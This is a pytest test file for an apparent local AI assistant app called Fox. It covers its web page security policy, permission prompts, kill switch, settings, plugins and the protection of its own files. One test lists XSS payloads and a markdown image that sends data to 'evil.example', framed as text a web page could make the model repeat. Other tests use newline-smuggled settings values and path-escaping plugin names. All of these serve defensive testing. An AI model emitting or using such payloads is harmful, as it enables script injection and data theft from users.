from __future__ import annotations

import json
import re
import shutil
import subprocess
import sys

import pytest
from fastapi.testclient import TestClient
from langchain_core.messages import AIMessage

from conftest import tool_call
from fox.config import ROOT, find_root, get_settings
from fox.core.permissions import Decision, PermissionRequest, Risk
from fox.env_file import EDITABLE_KEYS, update_env
from fox.server import Hub, create_app
from fox.tools.files import check_writable, resolve

TOKEN = "test-token"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}


def final(text="All done") -> AIMessage:
    return AIMessage(content=text)


def read_until(ws, kind: str) -> dict:
    event = ws.receive_json()
    while event["type"] != kind:
        event = ws.receive_json()
    return event


# --- The page ---


def test_page_is_served_without_token_but_holds_no_secrets(make_fox):
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        page = client.get("/")
        assert page.status_code == 200 and TOKEN not in page.text
        assert client.get("/static/app.js").status_code == 200


def test_page_cannot_run_scripts_from_elsewhere(make_fox):
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        policy = client.get("/").headers["content-security-policy"]
    assert "script-src 'self'" in policy and "default-src 'none'" in policy
    assert "unsafe-inline" not in policy and "unsafe-eval" not in policy


def test_page_has_no_inline_script_or_outside_address():
    page = (ROOT / "fox" / "gui" / "static" / "index.html").read_text(encoding="utf-8")
    assert "<script>" not in page and "http://" not in page and "https://" not in page


def test_api_docs_are_off(make_fox):
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        assert client.get("/docs").status_code == 404
        assert client.get("/openapi.json").status_code == 404


def test_own_page_may_open_the_websocket_but_only_on_its_own_port(make_fox):
    from starlette.websockets import WebSocketDisconnect

    with TestClient(create_app(make_fox([final()]), TOKEN, port=4567)) as client:
        with client.websocket_connect(f"/ws?token={TOKEN}", headers={"origin": "http://127.0.0.1:4567"}):
            pass
        with pytest.raises(WebSocketDisconnect):
            with client.websocket_connect(f"/ws?token={TOKEN}", headers={"origin": "http://127.0.0.1:9999"}):
                pass


@pytest.mark.skipif(shutil.which("node") is None, reason="Node.js isn't installed")
@pytest.mark.parametrize(
    "attack",
    [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "![x](https://evil.example/?data=secret)",
        "[click](javascript:alert(1))",
        '[click](https://x.example/"onmouseover="alert(1))',
        "`<svg onload=alert(1)>`",
        "```\n</code></pre><script>alert(1)</script>\n```",
        "| <b onclick=alert(1)>a</b> | b |\n|---|---|\n| <i>c</i> | d |",
        "> <iframe src=https://evil.example></iframe>",
        "# <style>body{display:none}</style>",
        "\u00000\u0000<script>alert(1)</script>",
    ],
)
def test_replies_can_never_become_live_html(attack, tmp_path):
    """A web page can make the model repeat any of this. It must stay plain text."""
    script = tmp_path / "render.mjs"
    module = (ROOT / "fox" / "gui" / "static" / "markdown.js").as_uri()
    script.write_text(
        f'import {{ renderMarkdown }} from "{module}";\n'
        "process.stdout.write(renderMarkdown(JSON.parse(process.argv[2])));\n",
        encoding="utf-8",
    )
    done = subprocess.run(["node", str(script), json.dumps(attack)], capture_output=True, text=True, timeout=30)
    assert done.returncode == 0, done.stderr
    html = done.stdout
    for tag in ("<script", "<img", "<iframe", "<svg", "<style", "<b ", "<i>"):
        assert tag not in html
    # Handler names may appear as escaped text or inside a quoted value, but never as a real attribute.
    for real_tag in re.findall(r"<[a-z][^>]*>", html):
        assert "javascript:" not in real_tag
        assert not re.search(r"\son\w+\s*=", re.sub(r'"[^"]*"', '""', real_tag)), real_tag


# --- Permission prompts over the API ---


def prompt(risk=Risk.NORMAL) -> PermissionRequest:
    return PermissionRequest(tool="t", scope="s", description="d", risk=risk)


class FakeClient:
    def __init__(self):
        self.sent = []

    async def send_json(self, payload):
        self.sent.append(payload)


async def test_prompt_only_accepts_what_it_offered():
    import asyncio

    hub = Hub()
    hub.clients.add(FakeClient())
    req = prompt(Risk.CRITICAL)
    waiting = asyncio.create_task(hub.request(req))
    await asyncio.sleep(0)
    hub.answer(req.id, "always")
    assert await waiting is Decision.DENY


async def test_unknown_answer_is_a_refusal():
    import asyncio

    hub = Hub()
    hub.clients.add(FakeClient())
    req = prompt()
    waiting = asyncio.create_task(hub.request(req))
    await asyncio.sleep(0)
    hub.answer(req.id, "sure, why not")
    assert await waiting is Decision.DENY


async def test_prompt_that_times_out_is_closed_on_screen():
    import asyncio

    hub = Hub()
    client = FakeClient()
    hub.clients.add(client)
    req = prompt()
    with pytest.raises(asyncio.TimeoutError):
        await asyncio.wait_for(hub.request(req), 0.01)
    assert client.sent[-1] == {"type": "permission_closed", "id": req.id}
    assert req.id not in hub.pending


async def test_prompt_tells_the_window_how_long_it_has():
    import asyncio

    hub = Hub(timeout=45)
    client = FakeClient()
    hub.clients.add(client)
    req = prompt()
    waiting = asyncio.create_task(hub.request(req))
    await asyncio.sleep(0)
    hub.answer(req.id, "deny")
    await waiting
    assert client.sent[0]["timeout"] == 45


async def test_spoken_answer_counts_but_an_unclear_one_leaves_the_prompt_open():
    import asyncio

    hub = Hub()
    hub.clients.add(FakeClient())

    async def clear(req):
        return Decision.ONCE

    hub.spoken = clear
    assert await hub.request(prompt()) is Decision.ONCE

    async def unclear(req):
        return None

    hub.spoken = unclear
    req = prompt()
    waiting = asyncio.create_task(hub.request(req))
    await asyncio.sleep(0.01)
    assert not waiting.done()
    hub.answer(req.id, "deny")
    assert await waiting is Decision.DENY


async def test_click_stops_the_spoken_question():
    import asyncio

    hub = Hub()
    hub.clients.add(FakeClient())
    stopped = asyncio.Event()

    async def still_listening(req):
        try:
            await asyncio.sleep(60)
        except asyncio.CancelledError:
            stopped.set()
            raise

    hub.spoken = still_listening
    req = prompt()
    waiting = asyncio.create_task(hub.request(req))
    await asyncio.sleep(0.01)
    hub.answer(req.id, "once")
    assert await waiting is Decision.ONCE
    await asyncio.wait_for(stopped.wait(), 1)


def test_attention_is_called_when_a_prompt_opens(make_fox):
    calls = []
    fox = make_fox([tool_call("_normal_tool", target="x"), final()])
    with TestClient(create_app(fox, TOKEN, on_attention=lambda: calls.append(1))) as client:
        with client.websocket_connect(f"/ws?token={TOKEN}") as ws:
            ws.send_json({"type": "message", "text": "go"})
            request = read_until(ws, "permission_request")
            ws.send_json({"type": "permission_response", "id": request["id"], "decision": "deny"})
            read_until(ws, "permission_closed")
            read_until(ws, "turn_end")
    assert calls == [1]


# --- Turns ---


def test_turn_end_comes_last_and_lets_the_next_message_run(make_fox):
    fox = make_fox([final("one"), final("two")])
    with TestClient(create_app(fox, TOKEN)) as client:
        with client.websocket_connect(f"/ws?token={TOKEN}") as ws:
            ws.send_json({"type": "message", "text": "first"})
            done = read_until(ws, "done")
            read_until(ws, "turn_end")
            ws.send_json({"type": "message", "text": "second", "session_id": done["session_id"]})
            assert read_until(ws, "done")["text"] == "two"
            read_until(ws, "turn_end")


def test_failed_turn_reports_the_error_and_ends(make_fox):
    fox = make_fox([RuntimeError("model down")])
    with TestClient(create_app(fox, TOKEN)) as client:
        with client.websocket_connect(f"/ws?token={TOKEN}") as ws:
            ws.send_json({"type": "message", "text": "hi"})
            assert "model down" in read_until(ws, "error")["message"]
            read_until(ws, "turn_end")


def test_history_shows_text_and_tool_names(make_fox):
    fox = make_fox([tool_call("get_datetime"), final("It is today")])
    with TestClient(create_app(fox, TOKEN)) as client:
        with client.websocket_connect(f"/ws?token={TOKEN}") as ws:
            ws.send_json({"type": "message", "text": "what day?"})
            session = read_until(ws, "done")["session_id"]
            read_until(ws, "turn_end")
        messages = client.get(f"/api/sessions/{session}/messages", headers=HEADERS).json()
    assert messages[0] == {"role": "human", "content": "what day?", "tool": None}
    assert [m["tool"] for m in messages if m["role"] == "tool"] == ["get_datetime"]
    assert messages[-1]["content"] == "It is today"


def test_bad_setting_gets_a_readable_message(make_fox, tmp_path):
    with TestClient(create_app(make_fox([final()]), TOKEN, env_path=tmp_path / ".env")) as client:
        detail = client.put("/api/settings", json={"values": {"SMTP_PORT": "abc"}}, headers=HEADERS).json()["detail"]
    assert detail.startswith("SMTP_PORT:") and "pydantic" not in detail


def test_voice_without_its_libraries_reports_why(make_fox, monkeypatch):
    monkeypatch.setattr("fox.server.voice_problem", lambda: "Voice libraries are missing")
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        with client.websocket_connect(f"/ws?token={TOKEN}") as ws:
            ws.send_json({"type": "voice_start"})
            assert "missing" in read_until(ws, "error")["message"]
            read_until(ws, "turn_end")


def test_voice_conversation_speaks_the_reply_and_returns_to_idle(make_fox, monkeypatch):
    import numpy as np

    import fox.voice.service as service

    spoken = []
    monkeypatch.setattr(service, "record_utterance", lambda *a, **k: np.zeros(100, dtype=np.float32))
    monkeypatch.setattr(service.Transcriber, "transcribe", lambda self, audio: "what time is it")
    monkeypatch.setattr(service.Speaker, "say", lambda self, text: spoken.append(text))

    fox = make_fox([final("It is noon.")])
    with TestClient(create_app(fox, TOKEN)) as client:
        with client.websocket_connect(f"/ws?token={TOKEN}") as ws:
            ws.send_json({"type": "voice_start"})
            assert read_until(ws, "voice_heard")["text"] == "what time is it"
            assert read_until(ws, "done")["text"] == "It is noon."
            states = []
            event = ws.receive_json()
            while event["type"] != "turn_end":
                states.append(event.get("state"))
                event = ws.receive_json()
    assert spoken == ["It is noon."]
    assert states[-1] == "idle"


def test_hands_free_ignores_speech_without_the_wake_word(make_fox, monkeypatch):
    import numpy as np

    import fox.voice.service as service

    heard = iter(["just chatting nearby", "Fox, what time is it", "goodbye fox"])
    monkeypatch.setattr(service, "record_utterance", lambda *a, **k: np.zeros(100, dtype=np.float32))
    monkeypatch.setattr(service.Transcriber, "transcribe", lambda self, audio: next(heard))
    monkeypatch.setattr(service.Speaker, "say", lambda self, text: None)

    fox = make_fox([final("Noon.")])
    with TestClient(create_app(fox, TOKEN)) as client:
        with client.websocket_connect(f"/ws?token={TOKEN}") as ws:
            ws.send_json({"type": "voice_start", "wake": True})
            assert read_until(ws, "voice_heard")["text"] == "what time is it"
            read_until(ws, "turn_end")


def test_stop_releases_the_microphone(make_fox, monkeypatch):
    import threading

    import fox.voice.service as service

    recording, released = threading.Event(), threading.Event()

    def record(*args, stop, **kwargs):
        recording.set()
        stop.wait(10)
        released.set()
        return None

    monkeypatch.setattr(service, "record_utterance", record)
    monkeypatch.setattr(service, "stop_playback", lambda: None)
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        with client.websocket_connect(f"/ws?token={TOKEN}") as ws:
            ws.send_json({"type": "voice_start", "wake": True})
            assert recording.wait(5)
            ws.send_json({"type": "cancel"})
            read_until(ws, "cancelled")
            read_until(ws, "turn_end")
    assert released.wait(5)


# --- Settings ---


def test_update_env_keeps_comments_and_replaces_only_named_keys(tmp_path):
    path = tmp_path / ".env"
    path.write_text("# my comment\nGROQ_API_KEY=old\nOTHER=keep\n", encoding="utf-8")
    update_env(path, {"GROQ_API_KEY": "new", "OPENAI_API_KEY": "added"})
    assert path.read_text(encoding="utf-8") == "# my comment\nGROQ_API_KEY=new\nOTHER=keep\nOPENAI_API_KEY=added\n"


@pytest.mark.parametrize("values", [{"NOT_A_SETTING": "x"}, {"FOX_DATA_DIR": "C:\\elsewhere"}, {"GROQ_API_KEY": "a\nFOX_DATA_DIR=b"}])
def test_update_env_refuses_unknown_keys_and_line_breaks(tmp_path, values):
    path = tmp_path / ".env"
    with pytest.raises(ValueError):
        update_env(path, values)
    assert not path.exists()


def test_every_editable_setting_is_a_real_setting():
    settings = get_settings()
    for key in EDITABLE_KEYS:
        assert hasattr(settings, key.lower()), key


def test_settings_api_never_returns_secrets(make_fox, tmp_path, monkeypatch):
    monkeypatch.setenv("GROQ_API_KEY", "super-secret-value")
    env = tmp_path / ".env"
    with TestClient(create_app(make_fox([final()]), TOKEN, env_path=env)) as client:
        assert client.get("/api/settings").status_code == 401
        saved = client.put("/api/settings", json={"values": {"GROQ_API_KEY": "super-secret-value"}}, headers=HEADERS)
        assert saved.status_code == 200
        assert saved.json()["secrets"]["GROQ_API_KEY"] is True
        assert "super-secret-value" not in saved.text
        assert "super-secret-value" not in client.get("/api/settings", headers=HEADERS).text
    assert "GROQ_API_KEY=super-secret-value" in env.read_text(encoding="utf-8")
    get_settings.cache_clear()


def test_settings_api_rejects_bad_values_without_touching_the_file(make_fox, tmp_path):
    env = tmp_path / ".env"
    env.write_text("SMTP_PORT=587\n", encoding="utf-8")
    with TestClient(create_app(make_fox([final()]), TOKEN, env_path=env)) as client:
        for values in ({"SMTP_PORT": "not a number"}, {"FOX_DATA_DIR": "x"}):
            assert client.put("/api/settings", json={"values": values}, headers=HEADERS).status_code == 422
    assert env.read_text(encoding="utf-8") == "SMTP_PORT=587\n"


def test_saved_key_takes_effect_without_a_restart(make_fox, tmp_path, monkeypatch):
    env = tmp_path / ".env"
    fox = make_fox([final()])
    built = []
    fox._router_factory = lambda s, chain, health: built.append(s) or fox.router
    with TestClient(create_app(fox, TOKEN, env_path=env)) as client:
        client.put("/api/settings", json={"values": {"FOX_WAKE_WORD": "fox"}}, headers=HEADERS)
    assert built and fox.settings is built[-1]
    get_settings.cache_clear()


def test_prefs_round_trip_and_reject_nonsense(make_fox):
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        assert client.put("/api/prefs", json={"theme": "dark", "speak": True}, headers=HEADERS).status_code == 200
        assert client.get("/api/prefs", headers=HEADERS).json() == {"theme": "dark", "speak": True}
        assert client.put("/api/prefs", json={"theme": "<script>"}, headers=HEADERS).status_code == 422


def test_reminders_and_facts_can_be_removed(make_fox):
    from datetime import datetime, timedelta

    fox = make_fox([final()])
    reminder = fox.store.add_reminder("gui test", datetime.now() + timedelta(days=1))
    fact = fox.store.add_fact("gui test fact")
    with TestClient(create_app(fox, TOKEN)) as client:
        assert any(f["id"] == fact for f in client.get("/api/facts", headers=HEADERS).json())
        client.delete(f"/api/facts/{fact}", headers=HEADERS)
        client.delete(f"/api/reminders/{reminder}", headers=HEADERS)
        assert not any(f["id"] == fact for f in client.get("/api/facts", headers=HEADERS).json())
        assert not any(r["id"] == reminder for r in client.get("/api/reminders", headers=HEADERS).json())


# --- Control, plugins and reset ---


def test_a_tool_can_be_turned_off_and_back_on(make_fox):
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        before = client.get("/api/status", headers=HEADERS).json()["tools_on"]
        client.post("/api/control/tools", json={"tool": "get_datetime", "enabled": False}, headers=HEADERS)
        tools = {t["name"]: t["enabled"] for t in client.get("/api/tools", headers=HEADERS).json()}
        assert tools["get_datetime"] is False
        assert client.get("/api/status", headers=HEADERS).json()["tools_on"] == before - 1
        client.post("/api/control/tools", json={"tool": "get_datetime", "enabled": True}, headers=HEADERS)
        assert client.get("/api/status", headers=HEADERS).json()["tools_on"] == before


def test_turning_off_an_unknown_tool_is_rejected(make_fox):
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        assert client.post("/api/control/tools", json={"tool": "no_such_tool", "enabled": False}, headers=HEADERS).status_code == 404


def test_kill_switch_can_be_turned_on_and_off_over_the_api(make_fox):
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        assert client.get("/api/status", headers=HEADERS).json()["kill_switch"] is False
        on = client.post("/api/control/kill", json={"on": True}, headers=HEADERS).json()
        assert on["kill_switch"] is True
        assert client.get("/api/control", headers=HEADERS).json()["kill_switch"] is True
        client.post("/api/control/kill", json={"on": False}, headers=HEADERS)
        assert client.get("/api/control", headers=HEADERS).json()["kill_switch"] is False


def test_a_turn_runs_no_tools_while_the_kill_switch_is_on(make_fox):
    # With the kill switch on, even a safe built-in tool is blocked, and the turn still finishes.
    fox = make_fox([tool_call("get_datetime"), final("stopped")])
    fox.control.set_kill_switch(True)
    with TestClient(create_app(fox, TOKEN)) as client:
        with client.websocket_connect(f"/ws?token={TOKEN}") as ws:
            ws.send_json({"type": "message", "text": "go"})
            blocked = read_until(ws, "tool_end")
            assert blocked["ok"] is False and "kill switch" in blocked["output"].lower()
            assert read_until(ws, "done")["text"] == "stopped"
            read_until(ws, "turn_end")


def test_kill_switch_cancels_tracked_turns():
    # The wiring the kill endpoint relies on: engaging it stops whatever is still running.
    import asyncio

    async def check():
        hub = Hub()
        task = asyncio.create_task(asyncio.sleep(100))
        hub.turns.add(task)
        task.add_done_callback(hub.turns.discard)
        await asyncio.sleep(0)
        stopped = hub.cancel_turns()
        await asyncio.sleep(0)
        return stopped, task.cancelled()

    stopped, cancelled = asyncio.run(check())
    assert stopped == 1 and cancelled


PLUGIN_CODE = (
    "from fox.core.permissions import Risk\n"
    "from fox.core.tooling import fox_tool\n\n"
    "@fox_tool(risk=Risk.SAFE)\n"
    "def plugin_greet() -> str:\n"
    '    """A plugin tool added in a test."""\n'
    '    return "hi"\n'
)


def test_a_plugin_can_be_added_listed_and_deleted(make_fox):
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        saved = client.put("/api/plugins/greeter", json={"code": PLUGIN_CODE}, headers=HEADERS)
        assert saved.status_code == 200 and saved.json()["tools"] == ["plugin_greet"]
        assert any(t["name"] == "plugin_greet" and not t["builtin"] for t in client.get("/api/tools", headers=HEADERS).json())
        assert client.get("/api/plugins/greeter", headers=HEADERS).json()["code"] == PLUGIN_CODE
        assert client.delete("/api/plugins/greeter", headers=HEADERS).json()["deleted"] is True
        assert all(t["name"] != "plugin_greet" for t in client.get("/api/tools", headers=HEADERS).json())


def test_a_plugin_that_fails_to_load_keeps_the_file_and_explains(make_fox):
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        broken = client.put("/api/plugins/broken", json={"code": "this is not python ("}, headers=HEADERS)
        assert broken.status_code == 422 and "failed to load" in broken.json()["detail"]
        assert any(p["file"] == "broken.py" and not p["ok"] for p in client.get("/api/plugins", headers=HEADERS).json())
        client.delete("/api/plugins/broken", headers=HEADERS)


@pytest.mark.parametrize("name", ["../escape", "with space", "UPPER", "dots.here"])
def test_plugin_names_that_escape_the_folder_are_rejected(make_fox, name):
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        # 422 from the name check, or 404 when the URL layer collapses a path like "../" first.
        # Either way nothing is written, and the name never reaches the filesystem.
        assert client.put(f"/api/plugins/{name}", json={"code": PLUGIN_CODE}, headers=HEADERS).status_code in (404, 422)


def test_reset_clears_only_the_chosen_scopes(make_fox):
    fox = make_fox([final()])
    session = fox.store.create_session("keep me")
    fact = fox.store.add_fact("remember this")
    with TestClient(create_app(fox, TOKEN)) as client:
        client.post("/api/reset", json={"scopes": ["memory"]}, headers=HEADERS)
        assert not client.get("/api/facts", headers=HEADERS).json()
        # Conversations were not in scope, so they stay.
        assert any(s["id"] == session for s in client.get("/api/sessions", headers=HEADERS).json())
        client.post("/api/reset", json={"scopes": ["conversations"]}, headers=HEADERS)
        assert not client.get("/api/sessions", headers=HEADERS).json()
    assert fact  # (silences the unused-variable linter; the fact's removal is checked above)


def test_reset_tools_turns_everything_back_on(make_fox):
    with TestClient(create_app(make_fox([final()]), TOKEN)) as client:
        client.post("/api/control/tools", json={"tool": "get_datetime", "enabled": False}, headers=HEADERS)
        client.post("/api/reset", json={"scopes": ["tools"]}, headers=HEADERS)
        assert not client.get("/api/control", headers=HEADERS).json()["disabled"]


# --- Running as Fox.exe ---


def test_exe_inside_the_project_uses_the_project_folder(tmp_path, monkeypatch):
    (tmp_path / "fox").mkdir()
    (tmp_path / "fox" / "__init__.py").touch()
    (tmp_path / "pyproject.toml").touch()
    monkeypatch.setattr(sys, "frozen", True, raising=False)
    monkeypatch.setattr(sys, "executable", str(tmp_path / "Fox.exe"))
    assert find_root() == tmp_path.resolve()


def test_exe_copied_elsewhere_uses_local_app_data(tmp_path, monkeypatch):
    monkeypatch.setattr(sys, "frozen", True, raising=False)
    monkeypatch.setattr(sys, "executable", str(tmp_path / "apps" / "Fox" / "Fox.exe"))
    monkeypatch.setenv("LOCALAPPDATA", str(tmp_path / "local"))
    assert find_root() == tmp_path / "local" / "Fox"


def test_seed_home_copies_defaults_once_and_never_overwrites(tmp_path, monkeypatch):
    from fox.gui import app as gui

    bundle = tmp_path / "bundle" / "defaults"
    (bundle / "agents").mkdir(parents=True)
    (bundle / "plugins").mkdir()
    (bundle / ".env.example").write_text("FOX=1\n", encoding="utf-8")
    (bundle / "agents" / "a.yaml").write_text("x", encoding="utf-8")
    home = tmp_path / "home"
    monkeypatch.setattr(sys, "frozen", True, raising=False)
    monkeypatch.setattr(sys, "_MEIPASS", str(tmp_path / "bundle"), raising=False)
    monkeypatch.setattr(gui, "ROOT", home)
    gui.seed_home()
    assert (home / ".env").read_text(encoding="utf-8") == "FOX=1\n" and (home / "agents" / "a.yaml").exists()
    (home / ".env").write_text("MY_KEY=secret\n", encoding="utf-8")
    gui.seed_home()
    assert (home / ".env").read_text(encoding="utf-8") == "MY_KEY=secret\n"


def fake_launches(monkeypatch, *codes, seconds=1.0):
    from fox.gui import launcher

    calls, clock = [], [0.0]

    def call(command, env):
        calls.append((command, env[launcher.RETRY_ENV]))
        clock[0] += seconds
        return codes[len(calls) - 1]

    monkeypatch.setattr(launcher.subprocess, "call", call)
    monkeypatch.setattr(launcher.time, "monotonic", lambda: clock[0])
    monkeypatch.setattr(launcher.sys, "argv", ["Fox.exe"])
    return launcher, calls


def test_startup_crash_is_retried_until_the_app_opens(monkeypatch):
    launcher, calls = None, None
    from fox.gui.launcher import STARTUP_CRASH

    launcher, calls = fake_launches(monkeypatch, STARTUP_CRASH, STARTUP_CRASH, 0)
    assert launcher.supervise() == 0
    assert [retry for _, retry in calls] == ["0", "1", "2"]
    assert all(launcher.WINDOW_FLAG in command for command, _ in calls)


@pytest.mark.parametrize("code", [0, 1, 0xC0000005])
def test_other_exits_are_never_retried(monkeypatch, code):
    launcher, calls = fake_launches(monkeypatch, code)
    assert launcher.supervise() == code
    assert len(calls) == 1


def test_crash_during_real_use_is_never_retried(monkeypatch):
    """Actions may have been under way, so running again by itself wouldn't be safe."""
    from fox.gui.launcher import STARTUP_CRASH, STARTUP_SECONDS

    launcher, calls = fake_launches(monkeypatch, STARTUP_CRASH, seconds=STARTUP_SECONDS + 1)
    assert launcher.supervise() == STARTUP_CRASH
    assert len(calls) == 1


def test_gives_up_with_a_message_when_every_attempt_crashes(monkeypatch):
    from fox.gui.launcher import MAX_ATTEMPTS, STARTUP_CRASH

    launcher, calls = fake_launches(monkeypatch, *[STARTUP_CRASH] * MAX_ATTEMPTS)
    shown = []
    monkeypatch.setattr(launcher, "ctypes", type("C", (), {"windll": type("W", (), {"user32": type("U", (), {"MessageBoxW": staticmethod(lambda *a: shown.append(a))})})}))
    assert launcher.supervise() == STARTUP_CRASH
    assert len(calls) == MAX_ATTEMPTS and len(shown) == 1


def test_fox_starts_loading_only_after_the_window_is_shown(monkeypatch):
    """So the "Starting up" page appears straight away."""
    import threading
    import time
    from types import SimpleNamespace

    from fox.gui import app as gui

    started, loaded = [], []
    shown = threading.Event()
    window = SimpleNamespace(events=SimpleNamespace(shown=shown), load_url=loaded.append, load_html=loaded.append)
    checks = {}

    def fake_start(boot, gui=None):
        thread = threading.Thread(target=boot)
        thread.start()
        time.sleep(0.1)
        checks["before_shown"] = list(started)
        shown.set()
        thread.join(5)

    fake_webview = SimpleNamespace(create_window=lambda *a, **k: window, start=fake_start)
    monkeypatch.setitem(sys.modules, "webview", fake_webview)

    class FakeServer:
        def start(self):
            started.append(True)
            return "http://address"

        def stop(self):
            pass

    monkeypatch.setattr(gui, "EmbeddedServer", FakeServer)
    gui.run_window()
    assert checks["before_shown"] == []
    assert started == [True] and loaded == ["http://address"]


def test_port_windows_refuses_is_replaced_by_another(monkeypatch):
    import socket

    from fox.gui import app as gui

    real_socket = socket.socket
    refusals = [PermissionError(10013, "forbidden"), PermissionError(10013, "forbidden")]

    class Picky(real_socket):
        def listen(self, *args):
            if refusals:
                raise refusals.pop()
            super().listen(*args)

    monkeypatch.setattr(gui.socket, "socket", Picky)
    sock = gui.open_local_socket("127.0.0.1")
    try:
        assert not refusals and sock.getsockname()[1] > 0
    finally:
        sock.close()


def test_port_gives_up_with_the_real_error_when_nothing_works(monkeypatch):
    import socket

    from fox.gui import app as gui

    class Refuses(socket.socket):
        def listen(self, *args):
            raise PermissionError(10013, "forbidden")

    monkeypatch.setattr(gui.socket, "socket", Refuses)
    with pytest.raises(PermissionError):
        gui.open_local_socket("127.0.0.1", attempts=3)


def test_a_folder_called_fox_is_not_mistaken_for_the_app():
    from fox.gui.app import is_fox_window

    assert is_fox_window("Fox", "WindowsForms10.Window.8.app.0.aec740_r26_ad1")
    assert not is_fox_window("Fox", "Windows.Internal.Shell.TabProxyWindow")
    assert not is_fox_window("Fox", "CabinetWClass")
    assert not is_fox_window("Firefox", "WindowsForms10.Window.8.app.0.aec740_r26_ad1")


@pytest.mark.parametrize(
    "path",
    [
        ROOT / "Fox.exe",
        ROOT / "Fox.lnk",
        ROOT / "_internal" / "python312.dll",
        ROOT / "scripts" / "build.ps1",
        ROOT / "fox.spec",
        ROOT / "build.bat",
        ROOT / "pyproject.toml",
        ROOT / ".venv" / "Scripts" / "python.exe",
        ROOT / "fox" / "gui" / "static" / "app.js",
    ],
)
def test_fox_cannot_change_what_builds_or_runs_it(path):
    from fox.core.tooling import ToolError

    with pytest.raises(ToolError):
        check_writable(resolve(str(path)))


def test_fox_cannot_change_a_copied_exe_but_can_use_the_folder_around_it(tmp_path, monkeypatch):
    from fox.core.tooling import ToolError

    monkeypatch.setattr(sys, "frozen", True, raising=False)
    monkeypatch.setattr(sys, "executable", str(tmp_path / "Fox" / "Fox.exe"))
    for protected in ("Fox.exe", "_internal/python312.dll"):
        with pytest.raises(ToolError):
            check_writable(resolve(str(tmp_path / "Fox" / protected)))
    neighbour = resolve(str(tmp_path / "Fox" / "notes.txt"))
    assert check_writable(neighbour) == neighbour
